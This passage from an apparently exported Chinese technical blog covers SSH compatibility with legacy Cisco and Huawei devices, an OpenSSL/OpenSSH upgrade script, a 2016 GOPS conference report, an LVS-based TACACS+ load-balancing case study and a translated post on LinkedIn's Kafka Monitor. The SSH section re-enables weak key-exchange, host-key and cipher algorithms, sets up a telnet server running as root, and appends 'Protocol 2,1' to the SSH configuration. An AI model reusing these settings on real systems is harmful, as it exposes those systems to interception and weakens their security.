user@127.0.0.1 或者在 ~/.ssh/config (/etc/ssh/ssh_config) 配置文件中:12Host somehost.example.orgKexAlgorithms +diffie-hellman-group1-sha1 命令行中ssh和“＋”号之间连接算法选项的配置，对客户端默认设置来说相当于替换。通过附加信息，你可以自动升级到最佳支持算法，当服务端开始支持它的时候。另一个例子，主机验证过程中，当客户端和服务端未能就公钥算法达成一致的时候： 12Unable to negotiate with 127.0.0.1: no matching host key type found.Their offer: ssh-dss OpenSSH 7.0 及以上版本同样禁用了 ssh-css(DSA)公钥交换算法。它也太弱了，我们强烈不建议使用它。1ssh -oHostKeyAlgorithms=+ssh-dss user@127.0.0.1 或者在 ~/.ssh/config 配置文件中:12Host somehost.example.orgHostkeyAlgorithms ssh-dss 视服务端配置情况而定，验证过程中其它连接参数也可能失败。你启用它们的时候，也许需要确定编码方式或者消息验证码配置选项。延伸：查询 SSH 已支持的算法1234ssh -Q cipher # 支持的编码方式ssh -Q mac # 支持的消息验证码ssh -Q key # 支持的公钥类型ssh -Q kex # 支持的密钥交换算法 最后，当你需要试图连接一个特殊主机的时候，也可以通过－G选项查询实际使用ssh配置。1ssh -G user@somehost.example.com 将列出所有的配置选项，包括被选用的编码方式，消息验证码，公钥算法，密钥算法参数的值。 客户端降级兼容Invalid key length client:OpenSSH_7.6p1, OpenSSL 1.1.0h-fips 27 Mar 2018server:cisco switcherror: ssh_dispatch_run_fatal: Connection to 192.168.1.11 port 22: Invalid key length 123Host * KexAlgorithms diffie-hellman-group1-sha1 Ciphers aes128-cbc 12345678910111213141516# ~/.ssh/ssh_configHost myserver Hostname mydomain.com User myusername Port 10022 Ciphers aes128-cbc MACs hmac-sha1 KexAlgorithms diffie-hellman-group1-sha1Host * Protocol 2 HostKeyAlgorithms ssh-rsa Ciphers aes256-ctr MACs hmac-sha2-512 KexAlgorithms diffie-hellman-group-exchange-sha256 IdentityFile ~/.ssh/id_rsa 服务端安全性增强RSA modulus too small现象：ssh 客户端提示 RSA modulus too small解决方案：增强服务端密钥长度 1234$ ssh user@192.168.3.1ssh_rsa_verify: RSA modulus too small: 512 &lt; minimum 768 bitskey_verify failed for server_host_key 思科路由器 crypto key generate rsa 12345678910111213cisco(config)#crypto key zeroize rsa % All RSA keys will be removed. % All router certs issued using these keys will also be removed. Do you really want to remove these keys? [yes/no]: yes cisco7200(config)#crypto key generate rsa The name for the keys will be: liyi-cisco7200.liyi.liyi.com Choose the size of the key modulus in the range of 360 to 2048 for your General Purpose Keys. Choosing a key modulus greater than 512 may take a few minutes. How many bits in the modulus [512]: 1024 % Generating 1024 bit RSA keys ...[OK] 华为路由器 rsa local-key-pair create 如果RSA密钥已经存在，将提示用户确认是否替换原有密钥。 12345678910$ system-view #进入系统视图[HUAWEI]rsa local-key-pair createThe key name will be: HUAWEI_Host % RSA keys defined for HUAWEI_Host already exist. Confirm to replace them? [Y/N]:y The range of public key size is (512 ~ 2048). NOTES: If the key modulus is greater than 512, It will take a few minutes. Input the bits in the modulus[default = 512]:1024 Generating keys... TipsTelnet 安装 1$ yum install telnet telnet-server 启动服务 1234567891011121314$ vi /etc/xinetd.d/telnetservice telnet&#123; flags = REUSE socket_type = stream wait = no user = root server = /usr/sbin/in.telnetd log_on_failure += USERID disable = yes ##默认值 no &#125;$ service xinetd start$ /etc/init.d/xinetd start 验证服务状态 1234$ less /etc/services | grep telnettelnet 23/tcptelnet 23/udp Upgrade OpenSSL &amp; OpenSSH 123456789101112131415161718192021222324252627282930313233343536373839#### Upgrade OpenSSL #######tar -xvf openssl*.tar.gzcd openssl*./config sharedmakemake installexport INSTALL_SSL_DATE=`date +%Y%m%d`echo $INSTALL_SSL_DATEmv /usr/bin/openssl /usr/bin/openssl_$INSTALL_SSL_DATEmv /usr/include/openssl/ /usr/include/openssl_$INSTALL_SSL_DATEln -s /usr/local/ssl/bin/openssl /usr/bin/opensslln -s /usr/local/ssl/include/openssl /usr/include/opensslecho "/usr/local/ssl/lib" &gt;&gt; /etc/ld.so.confldconfig -v#### Upgrade OpenSSH #######tar -xvf openssh*7.7.tar.gzcd openssh*./configure --with-ssl-dir=/usr/local/ssl --with-md5-passwordsmakemake installexport INSTALL_SSL_DATE=`date +%Y%m%d`echo $INSTALL_SSL_DATEmv /etc/ssh /etc/ssh_$INSTALL_SSL_DATEmv /usr/bin/ssh /usr/bin/ssh_$INSTALL_SSL_DATEmv /usr/sbin/sshd /usr/sbin/sshd_$INSTALL_SSL_DATEln -s /usr/local/bin/ssh /usr/bin/sshln -s /usr/local/sbin/sshd /usr/sbin/sshdecho "Protocol 2,1" &gt;&gt; /usr/local/etc/ssh_configchmod 755 /slview/.sshchmod 600 /slview/.ssh/authorized_keysln -s /usr/local/etc /etc/sshservice sshd restartecho "ssh-service running!!!!"ssh -V 扩展阅读《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 SSH登录旧设备的常见问题及解决方案 Linux系统下的ssh使用(依据个人经验总结) Everything you should know about certificates and PKI but are too afraid to ask 赵亚：令人作呕的OpenSSL]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>Linux</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[技术社群：高效运维(GOPS)]]></title>
    <url>%2F2016%2F09%2F24%2FDevOps-GOPS%2F</url>
    <content type="text"><![CDATA[摘要 2016 GOPS 上海站简报 扩展阅读：工程师的自我修养之全英文技术学习实践 一、2016 GOPS 上海站简报1.1 风向：从概念到落地延续这两年的风向，云计算、大数据、DevOps、容器等依然是比较热闹的话题。鉴于这些关键词已经比较普及，大家聊的内容开始更多地聚焦在落地应用上。比如关于OpenStack，有人从网络架构角度聊，也有人从数据中心、对象存储、可视化等方面聊。借用李明宇的一句话：“OpenStack是一个生态”，很多公司已经在利用其庞大生态的细分技术来创业了。 从行业分布来看，除了“传统的”几家巨头互联网公司，GOPS大会已经出现了越来越多的传统企业面孔，可能是上海金融中心的背景，银行、保险公司、银联等金融属性的企业参会的很多，此外中移动、石油系、旅游、快递业也很活跃，还办了中小企业专场。 最后，无论是现场交流环节的观众提问，还是我自己的体会，对于大部分人来说，最难的可能还是选型困境：技术方案不是太少，而是选择太多了。以分布式服务为例，有人推崇Zookeeper，有人选择etcd。前者有JAVA派的支持，后者也不乏Go粉的拥趸，或者有的时候就是拍脑袋决策呢？反正各有各的说法，根本也没个标准。希望以后哪位大牛可以来分享下《技术选型指南》。 1.2 特色：Google SRE 分享本人最感兴趣的是来自Google SRE的分享。 《Google SRE》一书的作者Chris Jones，主要是介绍了一些方法论方面的东西。看气质不像工程师，倒很有几分大学教授的味道。看过《Google SRE》几位作者的简历，除了工程师这个副业，还在斯坦福搞过什么经济学、国际关系、药学博士、文学、诗歌……，Jones则持有Computer Engineering,Economics,Technology Policy三个学位，长期在工程一线，还有professional engineer认证。这哥们还算是它们中间最接近工程师的啦。 Minghua Ye：印象比较深的是推荐了一堆开源库，command-line flags、google protocol buffer、Logging、Googletest…….也许这就是Google人的套路，每当谈到一个什么问题，要么是XXX发表了论文《XXXX》里有说明，要么就是我们发明了XXX技术／工具作为解决方案，开源代码的地址是：XXXX。 孙宇聪：他是《Google SRE》的 中文版译者，前Google SRE。最大的特点就是自带笑点，看得出活得很欢乐、发自内心的。活动现场很多国内企业的CTO、总监 可是极度缺乏这种欢乐。结合zookeeper，讨论了分布式系统的“太祖长拳”——共识系统的一些故事。 1.3 终极命题：人才大多数人可能并没有注意到，本次活动还有一个主题：人才。在热闹的开幕会场上，宣布了三件事： 1.“不出所料”，萧帮主终于从原企业离职，全职搞社区创业去了。2.社区和复旦大学合作，推出了联合培养软件工程硕士的项目。3.社区和EXIN合作，试水DevOps Master认证培训。 特别是后两件事，我其实不太乐观：干好很难，干砸很容易 。从业人才培养难题、在职人员的进修困境，早已有之，连BAT这样的巨头都时常流露出人才难求的尴尬境地。很多有识之士都曾经大声疾呼，但是商业和社区的冲突，能力和学历的争论，再加上当局和教育市场的避重就轻，这方面一直也没走出什么新路。归根到底，这需要产业结构、人才评价体制的根本提升。 不管怎么样，有些事总是需要有人去摸索吧，祝福。 关于工程师人才的微观定义，腾讯提了个自己的标准，供参考：业务和架构能力问题诊断能力开源组件的改造能力工具开发能力运营平台构建能力数据分析和决策能力…… 但是，个人觉得他们这个标准过于功利，还少那么一丢丢。 比如说，第一天Chris Jones演讲的时候，我内心深处是非常郁闷的。当时Jones说一句，孙宇聪在一旁翻译一句。这场面像极了总理新闻发布会，演讲人和翻译一句一顿，看着都蛋疼。说实话，很难有多少交流传播价值。可是，话说回来了，你要不翻译，至少80%以上的人还真就听不明白，公开活动毕竟要照顾大多数。托教育部的福，现在全国人民的学历线可谓蒸蒸日上，跟通货一样膨胀。但是从业人员的语言水平，能达到并保持一定水准的，还真没几个。 反省自己，阅读资料的时候，不也经常放着官方文档不读，非要去找些东拼西凑的二手货吗？过去买的参考书，原著比例是多少？也算写过几片技术文章吧，被Google索引的有多少？ 能有多少东西是可以和国际同行交流的？ 跨语言能力绝对是弯道超车的必备利器！ 工程师的自我修养：全英文技术学习实践。严肃地讨论一下技术人员的语言能力问题，希望您读完以后能够有所触动、有所行动、有所裨益。 Resources 官方实录和PPT下载 2016上海站日程表 扩展阅读DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于LVS的AAA负载均衡架构实践]]></title>
    <url>%2F2016%2F09%2F01%2FAAA%2F</url>
    <content type="text"><![CDATA[概要本次分享将从一次实际的负载均衡改造案例出发，通过介绍项目背景、选型思路、测试方法和问题分析等方面展开，总结负载均衡架构的一般套路和经验教训。 一、背景项目背景是某企业的AAA管理系统， AAA 即 Authentication（认证）、Authorization（授权）、Accounting（记账），是网络设备的一种集中化管理机制，可以在不同设备上为用户设置不同的权限，对网络安全起到监视作用。 AAA 服务是基于 TACACS+协议（Terminal Access Controller Access Control System Plus），TACACS＋是在 TACACS 协议的基础上进行了功能增强的安全协议，最早由Cicso提出并开放标准。该协议与 RADIUS 协议的功能类似，采用客户端/服务器模式实现 网元与 TACACS+ 服务器之间的通信，使用TCP 49端口。 每次TACACS+ 交互主要实现：认证 (Authentication): 确认访问网络的用户身份，判断访问者是否合法授权( Authorization ): 对通过认证的用户，授权其可以使用哪些服务记账( Accounting )：记录用户的操作行为、发生时间 1.问题描述系统架构如下图所示，服务器采用一主一备模式，一般情况下由Master服务器处理请求，如果它故障或者负荷过高、无法快速响应请求，网元会将请求发送到BackUP服务器处理。AAA Server上运行守护进程处理请求，记为TACACSD。 容量计算 服务端资源需求T＝ 认证请求规模g(n) ／ TACACSD运算能力 f(n) 在很长一段时间内，原有架构可以满足应用需求，但是随着集中化的深入推进，资源不足的问题日益严重：Master负荷早已爆满，BackUP的负荷也几乎与Master相当，而且请求从Master切换到BackUP的时候，非常容易引起失败。主要有三个关键因子的变化：1、管理设备数量增长10倍，而且还要继续增长2、网络配置自动化，单一网元的巡检、配置操作有数量级的提升3、TACACSD程序本身存在性能瓶颈，CPU消耗随着设备数量增长而增长 前两个因素属于业务需求，不能调整，程序性能问题涉及开发周期问题（这块以后再单独分析），迫于业务压力，我们必须快速寻找一种变通方案。 2.选型要求在选择适用方案之前，我们必须考虑以下几个要求： 可伸缩性（Scalability）当服务规模（设备数量、自动化操作次数）的负载增长时，系统能被扩展来满足需求（弹性扩展服务能力），且不降低服务质量。 高可用性（Availability）尽管部分硬件和软件会发生故障，整个系统的服务必须是每天24小时每星期7天可用的。（必须去除原来过于依赖单一服务器的瓶颈） 可管理性（Manageability）整个实现应该易于管理，提供灵活的负载均衡策略支持。 价格有效性（Cost-effectiveness）整个实现是经济的。这个怎么说呢，比如这个问题吧，有人说：买四层交换机啊？ 没钱！宇宙上最好服务器来一台？ 没钱！！于是我们的主要探索方向放在了开源软件，感谢开源社区解救穷人。 二、前戏我们首先想到的是HAProxy，一款经典的负载均衡开源软件。特别是具备以下几个特点：配置维护简单，支持热备，支持后端服务器的状态检测，可以自动摘除故障服务器；支持TCP 代理；支持Session的保持。 tcpThe instance will work in pure TCP mode.A full-duplex connection will be established between clients and servers,and no layer 7 examination will be performed. This is the default mode. It should be used for SSL, SSH, SMTP, … 12345678vi haproxy.cfglisten AAA-Cluster mode tcp bind 49 option tcplog source 0.0.0.0 usesrc clientip server AAA-Server-210 192.168.3.10:49 server AAA-Server-211 192.168.3.11:49 1.HAProxy+TProxy当我们满怀希望地推进之时，一个要命的问题摆在面前：后端的AAA服务器上看到的连接的Source IP都不再是用户原始的IP，而是前端的HAProxy服务器的IP， 官方文档对于source调度算法的描述： sourceThe source IP address is hashed and divided by the total weight of the &gt;running servers to designate which server will receive the request.This ensures that the same client IP address will always reach the sameserver as long as no server goes down or up.If the hash result changes due to the number of running serverschanging, many clients will be directed to a different server. TACACSD进程必须获取到认证请求的Source IP，为此我们尝试引入TProxy。它允许你”模仿”用户的访问IP，就像负载均衡设备不存在一样，TProxy名字中的T表示的就是transparent(透明)。当网元发起的认证请求到达后端的AAA服务器时，可以通过抓包看到的请求Source IP就是网元的真实IP。 即使用上“HAProxy+TProxy”的组合拳，还是存在另外一个问题：设备对于认证结果报文，似乎需要请求报文的目标地址（代理服务器）与结果报文的发送端（Real AAA Server）一致。 过程描述：网络设备会发送该用户的凭证到 TACACS+ 服务器进行验证，然后决定分配访问相关设备的权限，并将这些决定的结果包含在应答数据包中并发送到网络设备上，再由网络设备发送到用户终端。至于是否真的是这个校验规则，或者我们还没有找到更好的解释。暂且搁置，引述一段RFC 1492的说明，日后再补充这个问题。CONNECT(username, password, line, destinationIP, destinationPort)returns (result1, result2, result3) This request can only be issued when the username and line specifyan already-existing connection. As such, no authentication isrequired and the password will in general be the empty string. Itasks, in the context of that connection, whether a TCP connectioncan be opened to the specified destination IP address and port. 2.IPTABLES NAT为了解决上述Proxy无法传递Source IP 的问题，我们还尝试过基于 iptables 实现网络地址转换的方式，It’s Working !!123456789101112131415$ sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 49 -j DNAT --to 192.168.3.10-192.168.3.13$ sudo iptables -L -t nat -n -vChain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 0 0 DNAT tcp -- eth0 * 0.0.0.0/0 0.0.0.0/0 tcp dpt:49 to:192.168.3.10-192.168.3.13Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 0 0 MASQUERADE tcp -- * * 192.168.122.0/24 !192.168.122.0/24 masq ports: 1024-65535 0 0 MASQUERADE udp -- * * 192.168.122.0/24 !192.168.122.0/24 masq ports: 1024-65535 0 0 MASQUERADE all -- * * 192.168.122.0/24 !192.168.122.0/24 Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 如上即可解决HAProxy的Source IP 传递和报文回路的问题。压力测试的时候，开始设备数比较少的时候，各项业务还很正常，当设备数加到1.5万台左右，或者几百台设备并发请求的时候，报文转发的时延久急剧上升，甚至出现丢包情况。这个方案对我们来说显然存在性能瓶颈。 HAProxy—&gt;HAProxy + TProxy —&gt;IPTABLES NAT 转了一圈，回到起点。 三、终极杀器经过之前一波三折的折腾，我们决定启用一款终极杀器：LVS。LVS即Linux Virtual Server，是一个虚拟的服务器集群系统。它有三种工作模式NAT(地址转换),IP Tunneling(IP隧道)、Direct Routing(直接路由)。 NAT模式 TUN模式 DR模式 Server any Tunneling Non-arp device Server Network private LAN/WAN LAN Server Number low(10-20) HIGH(100) HIGH(100) Server Gateway load balancer own router own router 基于之前NAT方面的不良体验，我们这次直接选择了LVS-DR模式，LVS支持八种调度算法，我们选择轮询调度（Round-Robin Scheduling）。 LVS只处理一般连接,将请求给后端real server,然后由real server处理请求直接相应给用户,Direct Routing与IP Tunneling相比，没有IP封装的开销。 缺点：由于采用物理层,所以DR模式的调度器和后端real server必须在一个物理网段里,中间不能过路由器。 另外，为了防止LVS控制机的单点故障问题，还选用了Keepalived，负责LVS控制机和备用机的自动故障切换。 LVS依赖项：IPVS内核模块和ipvsadm工具包。具体配置不做过多说明，可以自行检索，关键注意以下几点： 12345678910111213141516171819202122#1）检查服务器是否已支持ipvsmodprobe -l |grep itvs# 2）检查依赖包：rpm -q kernel-develrpm -q gccrpm -q opensslrpm -q openssl-develrpm -q popt# 3）配置realserver节点ARP及VIP绑定脚本vi /etc/init.d/lvs# 4）启动LVS-DR/etc/init.d/lvsdr start# 5）查看VIP 情况ip addr list#6）启动realserver节点LVS/etc/init.d/lvs start 五、小结1. 各种负载均衡实现在网络中的位置 四层负载均衡的特点一般是在网络和网络传输层(TCP/IP)做负载均衡，而七层则是指在应用层做负载均衡。四层负载均衡对于应用侵入比较小，对应用的感知较也少，同时应用接入基本不需要对此做特殊改造。七层负载均衡一般对应用本身的感知比较多，可以结合一些通用的业务负载逻辑做成很细致的方案，比如我们通常用HAProxy/Nginx来做网站流量的分发。 实践再次教育我们，天下没有一招鲜，任何技术都有它的江湖位置。 2. 仿真能力这次实践可以用一句话概括就是：“成也仿真，败也仿真”。起初走了很长一段弯路，可以说是因为对整个负载均衡体系的理解不深入，也可以说是测试不足导致，凭着惯性，想当然地认为可以简单复制原来的“经验”，而忽视了实验环境的构建。 后来可以快速推进，是因为重新规整了测试方法和目标，并且基于虚拟机搭建了验证环境，包括引入了可以仿真路由器的GNS3平台，完整地测试了真实的业务流程。LVS集群环境也是先完成构建、试运行一段时间之后才完成的业务割接。 IPTABLES NAT的方案并没有在早期发现性能瓶颈，也说明这快的测试能力不足。 3.花边故事HAProxy的官网目前是被封锁的，国内不翻墙访问不了，Why ?在他们家的操作手册后面有LVS、Nginx的推荐链接。以前并没有注意。 TPROXY最早是作为Linux内核的一个patch，从linux-2.6.28以后TPRXOY已经进入官方内核。iptables只是Linux防火墙的管理工具而已，位于/sbin/iptables。真正实现防火墙功能的是Netfilter，它是Linux内核中实现包过滤，如果要探讨Netfilter，又会是一个很长的故事。 LVS开始于1998年，创始人是章文嵩博士，从Linux2.4内核以后，已经完全内置了LVS的各个功能模块。到今天为止，依然是目前国内IT业界达到Linux标准内核模块层面的唯一硕果。章博士同时是前淘宝基础软件研发负责人、前阿里云CTO，三个月前刚转会到滴滴打车任副总裁。淘宝技术体系曾大规模使用了LVS，不过最新消息，淘宝的同学已经鼓捣出一个VIPServer，正逐步替代了LVS。 罗列的这几条信息，其实与这次的主题关系不大，但确是整理这次篇帖子过程中，感觉很有意思的事情。技术并不冰冷，它就像个江湖，到底还是关于人的故事。 续集 可能更新，也可能不更新。 1、本次场景中，HAProxy方案为什么会失败？还缺少一个深度解释。2、本次场景中，LVS方案采用默认的轮询算法是否最优？3、本次场景中，7X24系统如何完成服务切换？4、本次场景中，IPTables NAT 的性能瓶颈如何解释？5、来一个关于 Netfilter 的讨论 案例与实务 最佳工程实践：Stack Overflow 架构 - 2016 Edition 最佳工程实践：Oracle 数据库迁移割接实践 最佳工程实践：基于LVS的AAA负载均衡架构实践 VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer 参考文献 Understanding TACACS+ TACACS+ and RADIUS Comparison HAProxy 2.0 and Beyond 章文嵩博士和他背后的负载均衡帝国 章文嵩：怎样做开源才有意义？ 胥峰(盛大):KVM部署LVS集群故障案例一则 iptables CLUSTERIP构建独特的负载均衡集群 | 赵亚，2017-09-16 Google 是如何做负载均衡的？| 2017-01-03 oilbeater TGO鲲鹏会 Application-Layer DDoS Attack Protection with HAProxy | by Chad Lavoie | Nov 9, 201 How to forward port using iptables in Linux]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>eBook</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：Kafka]]></title>
    <url>%2F2016%2F08%2F15%2FOpenSource-Kafka%2F</url>
    <content type="text"><![CDATA[摘要 一、How Kafka Works 二、Kafka Application：基于 Kafka 构建事件溯源模式的微服务 三、Best Practice | Kafka 最佳实践 ：LinkedIn 开源 Kafka Monitor 一、How Kafka Works Kafka is a log and not a queue. 二、Kafka Application 基于Kafka构建事件溯源模式的微服务讨论如何借助Kafka实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。 Best Practice | Kafka 最佳实践LinkedIn 开源 Kafka Monitor 一个关于Kafka的监控测试框架 LinkedIn.com:Open Sourcing Kafka Monitor Apache Kafka 已经成为了一个面向大规模流数据的，标准的消息系统。在Linkedin这样的公司，它被用作各类数据管道的主力，支持一系列关键服务。它已经成为确保企业基础架构健壮、容错和高性能的核心组件。 在过去,网站高可用工程师（SRE）必须依赖Kafka服务器的报告来度量、监控一个Kafka集群（例如，访问流量，离线分区计数，under-replicated分区计数，等等）。如果任何一个指标不可用，或者任何指标的值是异常的，都有可能是某些方面出错了，SRE则 需要介入问题排查。然而，从一个Kafka集群获得这些指标并不像听起来那么容易—无论集群是否可用，一个很低的流入流出值并不没有必要告诉我们，也不能为最终用户提供一个基于可用性经验的、细粒度的参考结果(比如说，在这个事件中描述道：只是一个分区的子集异常了）。随着我们的集群增长得愈加庞大，为越来越多的重要业务提供服务，可靠、精确地度量Kafka集群可用性的能力，也就变得越来越重要。 为了监控可用性，有必要主干的稳定性，从功能上或性能方面尽可能早的捕获可回溯的信息。Apache Kafka 在虚拟机中包含一系列单元测试和系统测试方法，用于检测错误。到目前为止，我们仍然能发现一些偶发错误，它们直到Kafka在真实的集群中已经部署很多天甚至几周之后才显现。这些错误会引起许多运行时开销或者导致服务中断。有些时候该问题很难被重现，SRE工程师只能在开发者找到原因之前回退到上一个版本，这显然要增加Kafka的部署和维护成本。在许多情况下，这些错误可以在更早的阶段就被探查出来，假如我们可以在一个具备多样化故障转移的环境部署Kafka，同时加载生产规模的流量、延长持续时间。 Kafka Monitor 是一个监控测试Kafka部署情况的框架，可以帮助我们针对上面的不足提供以下能力： （a）在生产集群持续监测SLA （b）在测试集群持续进行回归测试。在最近的 KafkaSummit 我们已经宣布在 Github上开源 Kafka Monitor。接下来我们将继续开发 Kafka Monitor 并把它作为我们事实上的Kafka认证解决方案。我们希望它也能使别的公司从中收益，那些希望验证和监控它们自己的Kafka部署情况的公司。 设计概览Kafka Monitor 使得这些事情变得很容易：在真实的生产集群中，开发和执行长时间运行特定的Kafka系统测试，基于用户提供的SLA监控已经部署的Kafka。 开发者可以创建新的测试，通过组装可复用的组件，用来仿真各种各样的场景（例如 GC 中断，代理被硬杀，回滚，磁盘故障，等等），收集指标；用户可以运行 K afka Monitor测试用例，在这些场景执行的时候可以伴随用户定义的定时任务，无论是测试集群还是生产集群，都能够验证，Kafka在这些场景下，是否能够达到预期效果。 为了实现上述目标，Kafka Monitor 的设计模型包含一系列测试结果收集器和服务。 一个Kafka Monitor 实例运行在一个单独的Java进程，在相同的进程里可以再产生多个测试用例和服务。下面的示意图表达了服务，测试用例和Kafka Monitor实例之间的关系，也可以知道Kafka Monitor 如何在Kafka集群和用户之间相互作用。 测试一个典型的测试，将仿真一系列场景，基于某些前期已经定义的定时任务，需要启动一些生产者／消费者，上报指标，验证指标值是否符合前期定义的断言。举个例子，Kafka Monitor 能够启动一个生产者，一个消费者，每五分钟反射一个随机代理（比方说，如果说它是监控一个测试集群）。Kafka Monitor 接下来就可以度量可用性，消息丢包率，揭露JMX指标，用户可以在一个实时的健康仪表盘看到这些信息。 如果消息丢包率比一些阀值还要大，它能发出告警，这些阀值基于用户特定的可用性模型确定。 服务我们概括了仿真逻辑，针对持续长时间场景的服务，目的是为了加快、简化从复用组件组装测试的过程。一个服务将再产生它自己的线程，去执行那些场景、测量指标。举例说明，我们现在已经具备如下服务： 生产者服务，生成Kafka消息，测量生产速率和可用性指标。 消费者服务，消费Kafka消息，测量消息丢包率，消息复制速率以及端到端时延。这些服务依赖于生产者服务来提供消息，它会嵌入一个消息序列号和时间戳。 代理反射服务，能够基于预定义的定时任务提供一个发射代理。 一种测试需要由许多服务组成，验证一系列超时场景。举例来说，我们可以创建一个测试，包含一个生产者服务，一个消费者服务，以及一个代理反射服务。这个生产者服务和消费者服务，将被配置为从同一个主题发送和接收消息。那么这个测试将验证消息丢包率持续为0。 使用多个Kafka Monitor实例进行集群间性能测试当所有的服务和相同的Kafka Monitor实例必须运行在同一个物理机器上的时候，我们可以启动多个Kafka Monitor 实例在不同的集群，一起协作完成一个精密控制的端到端测试。在下面这个测试示意图中，我们启动了两个Kafka Monitor 实例在两个集群中。第一个Kafka Monitor 实例包含一个生产者服务，提供给Kafka 集群1。消息从集群1反射到集群2。最后，在第二个Kafka Monitor 实例的消费者服务，处理了消息，来自集群2中的同一个主题，并且报告了通过集群通道的端到端时延。 Kafka Monitor 在 LinkedIn 的应用 监控Kafka集群部署情况在2016年早些时候，我们部署了Kafka Monitor用来监控可用性和端到端时延，包括LinkedIn的每一个Kafka集群。本项目的 wiki 展示了更多细节，以及这些指标是如何度量的。这些基本但是关键的指标，对于积极地监控我们Kafka集群的SLA非常有用。 在端到端工作流中验证客户端库正如早先发布的一篇BLOG中说明的那样，我们有一个客户端的库，缠绕在普通的Apache Kafka生产者和消费者，用于提供一些 Apache Kafka 无法支持的特性，例如Avro编码，审计和大消息支持。我们也有一个REST客户端，它允许非JAVA应用程序从Kafka生产和消费数据。这些客户端库和每一个新的Kafka release版本，验证它们的功能可用性是非常重要的。Kafka Monitor允许用户将客户端库作为插件，加入到它的端到端工作流中。我们已经部署的Kafka Monitor实例，已经在测试中使用我们封装的客户端和REST客户端，用于验证它们的性能和功能，使得这些客户端库和Apache Kafka的每一个新的release版本都能符合要求。 验证Apache Kafka新的内部Release版本我们通常每个季度都会从Apache Kafka的主干版本复制代码，然后建立一个新的内部release版本，或者吸收Apache Kafka新的特性。从主干复制代码的一个重要的收益就是，部署Kafka到LinkedIn的生产集群之后，通常能在Apache Kafka的主干版本上探查到一些问题，这样的话我们就能在Apache Kafka 官方正式的release发布之前获得修复。基于复制Apache Kafka主干版本可能存在的风险，我们做了额外的工作，在一个测试集群中验证每个内部release版本—从生产集群中获得镜像流量—几周以前生产环境部署新的release。举例来说，我们执行回退或者硬杀掉代理的时候，需要检查JMX指标去验证确实有一个控制进程并且没有离线分区，为了验证Kafka在故障迁移场景中的可用性。在过去，这些步骤都是手工进行的，非常消耗时间，并且我们有大量事件和许多场景需要测试，这种方式的伸缩性就非常差。我们切换到Kafka Monitor之后，这个过程就自动化了，并且可以覆盖更多故障迁移的场景，而且是可以持续进行的。 相关工作的比较Kafka Monitor 对其它公司而言也是有用的，可以帮助验证他们自己的客户端库和Kafka集群。当然 Microsoft 也已经在 Github 上有了一个开源项目，也是监控室Kafka集群的可用性和端到端时延。同样地，在这篇发表的博客中，Netflix介绍了一种监控服务，即发送持续的心跳消息，同时度量这些消息的时延。Kafka Monitor自己的特点就是专注于可扩展性，模块化以及客户端库和多样化场景支持。 开始Kafka Monitor的源代码可以从 Github 下载，基于Apache 2.0 授权协议。使用指南，设计文档和未来规划在README文件和项目wiki中可以查阅。我们很乐于听到你对该项目的反馈意见。当Kafka Monitor被设计用来作为，测试和监控Kafka部署情况的框架的时候，我们视线了一个基本的但是有用的测试，确保你能开箱即用。这些测试可以度量可用性，端到端时延，消息丢包率以及消息复制速率，通过运行一个生产者和一个消费者，它们使用同一个主题生产／处理消息。你可以在终端看到这些指标，基于HTTP GET请求、程序化地获得它们的值，甚至随着时间查看它们的值，通过一个简单（快速启动）的图形界面，如下面的截图所示。关于如何运行测试、查看指标的详细介绍内容请参阅项目网站。 未来的工作我们的计划中有许多工作要做，改进、提升 Kafka Monitor，使它更有用。 增强测试场景每次执行代码 check-in 的时候，Apache Kafka 包含了一大批系统测试。我们计划在Kafka Monitor中实现一个简单的测试，然后部署到LinkedIn的测试集群，最终做到持续运行这些测试。这使得我们可以在问题发生的时候进行性能回溯，还可以验证各种特性的是否可用，例如限额、管理操作，授权，等等。 整合Graphite和类似的框架它对用户来说非常有用，可以在他们的组织内，通过一个简单的 web 服务查看所有跟 Kafka 相关的指标。我们计划在 Kafka Monitor 中提升现有的报表服务，这样用户就能够导出 Kafka Monitor 的指标到 Graphite 或者他们选择的其它框架 整合故障注入框架我们也计划将 Kafka Monitor 与故障注入框架整合（名叫 Simoorg），可以测试、收集Kafka在更全面的故障迁移场景中的处理能力，例如磁盘故障或者数据错误。 扩展阅读：开源架构技术漫谈 Stack Overflow：2017年最赚钱的编程语言 玩转编程语言:构建自定义代码生成器 